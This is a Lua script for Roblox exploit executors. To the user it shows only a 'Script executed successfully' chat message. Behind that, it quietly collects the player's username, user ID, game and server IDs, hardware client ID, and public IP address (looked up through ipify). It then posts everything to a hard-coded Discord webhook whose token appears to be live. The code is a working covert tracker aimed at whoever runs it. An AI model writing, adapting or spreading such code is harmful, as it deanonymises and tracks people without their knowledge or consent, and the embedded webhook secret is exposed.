local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Analytics = game:GetService("RbxAnalyticsService")
local MarketplaceService = game:GetService("MarketplaceService")
local StarterGui = game:GetService("StarterGui")

local Webhook_URL = "https://discord.com/api/webhooks/1111606979585130537/0joXFyaI312c33vvQLZ0-7M7dCOJJjIeRYQVxB2qyMg79N0ZSZokugMrbI9G9WhoOnHl"
local requestFunc = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)

if _G.ScriptAlreadySent then return end
_G.ScriptAlreadySent = true

pcall(function()
    StarterGui:SetCore("ChatMakeSystemMessage", {
        Text = "[Reds]: Script executed successfully.";
        Color = Color3.fromRGB(85, 255, 127);
        Font = Enum.Font.SourceSansBold;
        FontSize = Enum.FontSize.Size24;
    })
end)

local player = Players.LocalPlayer
local placeInfo
pcall(function()
    placeInfo = MarketplaceService:GetProductInfo(game.PlaceId)
end)

local currentTime = os.date("!%Y-%m-%dT%H:%M:%SZ")

-- === Try getting IP (if supported) ===
local ipAddress = "Unavailable"
pcall(function()
    local ipRes = requestFunc({
        Url = "https://api.ipify.org?format=json",
        Method = "GET"
    })
    if ipRes and ipRes.Body then
        local decoded = HttpService:JSONDecode(ipRes.Body)
        if decoded and decoded.ip then
            ipAddress = decoded.ip
        end
    end
end)

local embed = {
    title = "**Script Execution Log**",
    description = player.DisplayName .. " has executed the script.",
    type = "rich",
    color = tonumber(0xffffff),
    timestamp = currentTime,
    fields = {
        {
            name = "Username",
            value = player.Name,
            inline = true
        },
        {
            name = "User ID",
            value = tostring(player.UserId),
            inline = true
        },
        {
            name = "Place Name",
            value = placeInfo and placeInfo.Name or "Unknown",
            inline = true
        },
        {
            name = "Place ID",
            value = tostring(game.PlaceId),
            inline = true
        },
        {
            name = "Job ID",
            value = game.JobId ~= "" and game.JobId or "Private/Local",
            inline = true
        },
        {
            name = "Hardware ID",
            value = Analytics:GetClientId(),
            inline = false
        },
        {
            name = "Public IP",
            value = ipAddress,
            inline = false
        }
    }
}

-- === Send webhook ===
if requestFunc then
    requestFunc({
        Url = Webhook_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({
            content = "",
            embeds = {embed}
        })
    })
end